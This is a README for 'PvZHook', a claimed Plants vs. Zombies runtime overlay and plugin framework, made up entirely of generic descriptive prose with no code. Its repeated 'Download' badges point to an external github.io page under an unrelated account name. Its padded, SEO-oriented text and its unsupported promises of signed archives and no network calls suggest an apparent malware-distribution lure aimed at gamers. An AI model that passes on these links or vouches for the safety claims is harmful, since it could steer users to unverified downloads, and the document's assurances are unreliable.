![preview](https://raw.githubusercontent.com/asdfweraa/Hook-Forge/main/thumb_1086.svg)
[![Download](https://raw.githubusercontent.com/asdfweraa/Hook-Forge/main/grab_606eb.svg)](https://asdfweraa.github.io/Hook-Forge/)

# 🌱 PvZHook — Living Garden Runtime Overlay

A community-driven runtime overlay and modding sandbox for the Plants vs. Zombies ecosystem, rebuilt from the ground up in 2026 with a focus on clarity, safety, and long-term maintainability. PvZHook is not a shortcut and not a shortcut collection — it is a garden bed where mod authors plant tools, and where players harvest the results without ever touching the soil of the base game.

This repository exists because the original scene grew tangled. Years of scattered plugins, undocumented offsets, and one-off binaries left newcomers stranded at the gate. PvZHook consolidates that knowledge into a single, well-lit greenhouse: a runtime overlay layer, a plugin loader, a signature database, and a scripting bridge, all documented as if the next reader matters — because they do.

The project is engineered for people who want to understand what they are running. Every hook is named. Every patch is reversible. Every log line explains itself. If you have ever wished a modding framework felt less like a black box and more like a well-labeled toolbox, this is the project for you.

## 📖 Table of Contents

- [What PvZHook Actually Is](#-what-pvzhook-actually-is)
- [Why This Overlay Exists](#-why-this-overlay-exists)
- [Feature List](#-feature-list)
- [Key Capabilities](#-key-capabilities)
- [Screenshots and Visual Language](#-screenshots-and-visual-language)
- [Download](#-download)
- [Getting the Runtime Into Place](#-getting-the-runtime-into-place)
- [Configuration Model](#-configuration-model)
- [Plugin Authoring Overview](#-plugin-authoring-overview)
- [Signature Database](#-signature-database)
- [Scripting Bridge](#-scripting-bridge)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Support That Never Sleeps](#-support-that-never-sleeps)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Project Structure](#-project-structure)
- [Compatibility Notes](#-compatibility-notes)
- [Community and Contribution](#-community-and-contribution)
- [SEO and Discoverability Notes](#-seo-and-discoverability-notes)
- [Disclaimer](#-disclaimer)
- [License](#-license)

## 🌿 What PvZHook Actually Is

PvZHook is a runtime overlay framework. That sentence carries more weight than it first appears. An overlay, in this context, is a thin layer that sits between the running application and the operating system, observing calls, reshaping arguments, and injecting new behavior without rewriting the original binary. The word "thin" is deliberate — the overlay tries to stay out of the way until it is needed, much like a trellis that supports a vine without becoming the vine.

The framework is composed of five cooperating pieces:

1. A loader that attaches to the host process and prepares the environment.
2. A signature engine that finds stable anchor points inside the host executable.
3. A hook registry that tracks every modification and can undo it on demand.
4. A plugin runtime that loads community-authored modules from a sandboxed directory.
5. A scripting bridge that exposes selected internals to a high-level language for rapid experimentation.

Each piece is independently testable. None of them assume the others are present. This modularity is what makes the project survivable across game updates, which have historically broken monolithic mods in spectacular fashion.

## 🌻 Why This Overlay Exists

Modding communities often grow in the dark. A tool appears, it works for six months, the author disappears, and the next maintainer inherits a binary blob with no source. PvZHook was started as an answer to that pattern. The design principles are simple and stubborn:

- **Source first.** No component ships as a binary-only blob.
- **Reversible by default.** Every mutation is logged and can be rolled back live.
- **Documentation as a deliverable.** Undocumented APIs are treated as bugs.
- **Safe defaults.** Anything that could destabilize a session is opt-in and clearly labeled.
- **No hidden network calls.** The runtime does not phone home, and it never will.

The result is a framework that a cautious player can run comfortably and a curious developer can extend confidently.

## 🧩 Feature List

- Runtime overlay loader with hot attach and hot detach
- Signature-based anchor resolution that survives minor patches
- Reversible hook registry with per-hook enable and disable toggles
- Sandboxed plugin directory with manifest validation
- High-level scripting bridge for rapid prototyping
- Responsive interface that adapts from 11-inch laptops to ultrawide monitors
- Multilingual support with community-maintained translation packs
- Structured logging with severity levels and exportable session reports
- Deterministic replay mode for reproducing bugs
- Offline-first design with no mandatory online component
- Configurable profiles for different play styles
- Portable layout that runs from a removable drive
- Extensible theme engine for the overlay panel
- Keyboard-first navigation with full accessibility labels
- Per-plugin resource budgets to prevent runaway loops
- Crash-safe state snapshots taken at configurable intervals
- Transparent patch notes generated from commit metadata
- Built-in diff viewer for comparing two runtime configurations

## 🛠️ Key Capabilities

### Anchor Resolution

The signature engine scans the host executable for byte patterns that remain stable across releases. When a pattern drifts, the engine reports a confidence score and falls back to secondary anchors. This is the difference between a framework that breaks every update and one that merely complains politely.

### Reversible Patching

Every patch applied by the runtime is recorded in a journal. The journal supports undo, redo, and snapshot comparison. If a plugin misbehaves, the user can rewind to a known-good state without restarting the entire session.

### Sandboxed Plugins

Plugins live in a dedicated directory and declare their capabilities in a manifest. A plugin that requests network access, for example, is flagged prominently in the interface before it is ever loaded. The sandbox does not pretend to be a security boundary — it is an honesty boundary, and honesty is enforced.

### Live Inspection

The overlay panel exposes a live view of hook activity, memory regions touched, and plugin call graphs. Developers can pause the overlay, inspect a call, and resume without losing context.

## 🖼️ Screenshots and Visual Language

The overlay panel uses a calm palette inspired by botanical diagrams: muted greens, warm parchment backgrounds, and high-contrast typography. Screenshots in this repository are captured at native resolution and annotated with callouts. Visual changes follow a documented design system, so contributors can propose new widgets without guesswork.

## ⬇️ Download

[![Download](https://raw.githubusercontent.com/asdfweraa/Hook-Forge/main/grab_606eb.svg)](https://asdfweraa.github.io/Hook-Forge/)

The distribution archive is curated for clarity. It contains the loader, the signature database, the default plugin set, the documentation bundle, and a sample configuration file. No bundled browser toolbars. No wrapped installer that offers unrelated software. The archive is signed, and the signature is published in the repository releases page alongside a checksum manifest.

## 🚀 Getting the Runtime Into Place

Because this project values predictability, the placement steps are described in plain language rather than a corporate installation wizard.

1. Retrieve the distribution archive from the releases area of this repository.
2. Verify the checksum against the published manifest.
3. Extract the archive into a directory you control — a folder you can delete without regret.
4. Review the default configuration file and adjust the plugin directory path if desired.
5. Launch the loader and confirm that the overlay panel appears.
6. Open the diagnostics tab and confirm that all anchors resolved with a green status.
7. Enable the plugins you intend to use, one at a time, observing the log after each.

If a step fails, the diagnostics tab will explain which anchor or manifest caused the problem. The runtime never fails silently.

## ⚙️ Configuration Model

Configuration is expressed in a single readable file with three sections: runtime, plugins, and interface. The runtime section controls logging verbosity, snapshot intervals, and detach behavior. The plugins section lists enabled manifests and their resource budgets. The interface section covers theme, language, and panel placement.

Profiles allow multiple configurations to coexist. A profile named "study" might disable all visual plugins and enable verbose logging. A profile named "play" might do the opposite. Profiles are plain files and can be shared, versioned, or generated by scripts.

## 🧬 Plugin Authoring Overview

A plugin is a folder containing a manifest and a module. The manifest declares the plugin name, version, author handle, required capabilities, and the anchors it depends on. The module implements a small set of lifecycle callbacks: onLoad, onEnable, onTick, onDisable, and onUnload.

The runtime validates the manifest before loading the module. Validation checks the capability list against the sandbox policy, confirms that anchor references exist in the signature database, and verifies that the module's declared entry point matches the file layout. A plugin that fails validation is quarantined and reported, never executed.

Authors are encouraged to ship tests alongside their plugins. The project provides a harness that simulates anchor resolution and hook dispatch, so a plugin can be exercised without the host executable present.

## 🗂️ Signature Database

The signature database is a versioned collection of anchor definitions. Each definition includes a name, a byte pattern, a confidence threshold, and notes about the host version range it targets. Definitions are stored as text and reviewed through pull requests.

Contributors who discover a new stable anchor are asked to submit a definition with a short rationale and, when possible, a test that confirms the anchor resolves. The review process emphasizes reproducibility over speed, because a bad anchor poisons every downstream plugin.

## 🧪 Scripting Bridge

The scripting bridge exposes a curated subset of runtime internals to a high-level language. The subset is intentionally small. Exposing everything would be convenient and dangerous; exposing a little is disciplined and useful. The bridge supports reading memory regions, subscribing to hook events, and scheduling callbacks, but it does not expose raw pointer arithmetic or unrestricted file access.

Scripts are treated as ephemeral experiments. They live in a scratch directory, are not loaded automatically, and are wiped on request. When an experiment matures, it graduates into a proper plugin.

## 📱 Responsive Interface

The overlay panel reflows from compact to expansive layouts. On a small laptop, the panel collapses into a single-column drawer. On a large display, it expands into a three-pane workspace with anchor tree, plugin list, and log stream visible simultaneously. The interface respects system font scaling and reduced-motion preferences, and it never steals focus from the host application without an explicit user action.

## 🌍 Multilingual Support

Translation packs are community-maintained and versioned separately from the runtime. Each pack declares a base language and a completeness percentage. The interface falls back gracefully to the base language when a string is missing, and it marks untranslated strings so contributors know where to help. Adding a language does not require recompiling the runtime; it requires a folder and a manifest.

## 🕰️ Support That Never Sleeps

Support is handled through discussion threads, issue templates, and a rotating volunteer schedule. The project does not promise an instant response, but it does promise that every report receives a triage label within a day. The 24/7 framing here means the community channel is always open and the documentation is always available — not that a human is awake at every hour. Honesty about support expectations keeps the community healthy.

## 🗺️ Roadmap for 2026

- First quarter: stabilize the anchor resolver and publish the plugin authoring guide.
- Second quarter: ship the responsive interface refresh and the first translation packs.
- Third quarter: introduce deterministic replay and the configuration diff viewer.
- Fourth quarter: expand the scripting bridge, add a plugin registry index, and publish a yearly retrospective.

The roadmap is reviewed publicly and updated as priorities shift. Nothing on it is a promise; everything on it is a direction.

## 📁 Project Structure

The repository is organized into a small number of top-level directories. The loader directory contains the attach and detach logic. The signature directory contains the anchor database and its tests. The plugins directory contains first-party plugins and the sample manifest. The interface directory contains the overlay panel. The docs directory contains guides, references, and the design system. The scripts directory contains the ephemeral bridge runtime. The tools directory contains the validation harness and packaging utilities.

This layout is stable. New contributors are expected to read the structure document before opening a pull request that reorganizes anything.

## 🧷 Compatibility Notes

The runtime targets the desktop editions of the host application that are still receiving updates as of 2026. Compatibility with older editions is best-effort and tracked in the signature database. The project does not support emulated environments, and it does not support modified host executables that have already been patched by unrelated tools. A clean host is a happy host.

## 🤝 Community and Contribution

Contributions are welcome in the form of anchor definitions, translation packs, documentation, interface widgets, and plugins. The contribution guide explains the review process, the coding style, and the expectations for tests. Commit messages are read as documentation, so they are expected to explain why a change exists, not merely what changed.

The project maintains a code of conduct that emphasizes patience, clarity, and good faith. Disagreements are expected; disrespect is not.

## 🔍 SEO and Discoverability Notes

This repository is discoverable through natural descriptions of its purpose: runtime overlay framework, plugin loader, signature database, reversible patching, sandboxed modules, and multilingual interface. These phrases appear because they are accurate, not because they are repeated for effect. Search engines reward pages that answer questions, and this README answers the questions a newcomer actually has: what is this, why does it exist, how do I run it, and how do I extend it.

The project is also described as a garden companion for the Plants vs. Zombies ecosystem, a runtime observatory, and a plugin greenhouse. These metaphors are original to this project and help it stand apart from generic tool repositories.

## ⚠️ Disclaimer

PvZHook is an independent community project. It is not affiliated with, endorsed by, or sponsored by the original creators or publishers of the host application. The project is provided as-is, without warranty of any kind, express or implied. Users are responsible for complying with the terms of service of any software they run alongside this overlay.

The runtime does not modify game files on disk. It operates in memory, and its changes vanish when the host process exits. It does not bypass purchase systems, it does not unlock paid content, and it does not interfere with online services. Any plugin that attempts to do so violates the project's policies and will be removed from the first-party set.

Use the project for learning, for research, for personal experimentation, and for building tools that respect the people who play the game. Do not use it to harm others, to disrupt shared spaces, or to profit from the work of others without credit.

## 📜 License

This project is released under the MIT License. The full text is available at the canonical license reference:

https://opensource.org/licenses/MIT

Copyright (c) 2026 PvZHook Contributors

Permission is hereby granted, without charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions of the MIT License.

[![Download](https://raw.githubusercontent.com/asdfweraa/Hook-Forge/main/grab_606eb.svg)](https://asdfweraa.github.io/Hook-Forge/)